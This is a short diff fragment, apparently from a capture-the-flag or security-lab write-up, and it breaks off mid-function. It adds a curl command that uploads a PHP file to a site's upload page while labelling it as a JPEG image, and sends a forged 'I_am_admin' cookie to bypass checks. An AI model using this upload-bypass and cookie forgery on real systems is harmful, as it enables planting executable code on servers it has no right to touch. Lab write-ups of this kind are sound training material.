@@ -1,6 +1,18 @@
 
 
 
+```
+curl http://{IP_ADDRESS}/index.php\?page=upload \
+-F "Upload=Upload" \
+-F "uploaded=@test.php;type=image/jpeg" \
+-F 'MAX_FILE_SIZE=100000' \
+-H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327'
+```
+
+OR
+
+
+
 async function viewFullUploadResponse() {
   // Get current origin dynamically
   const baseUrl = window.location.origin;
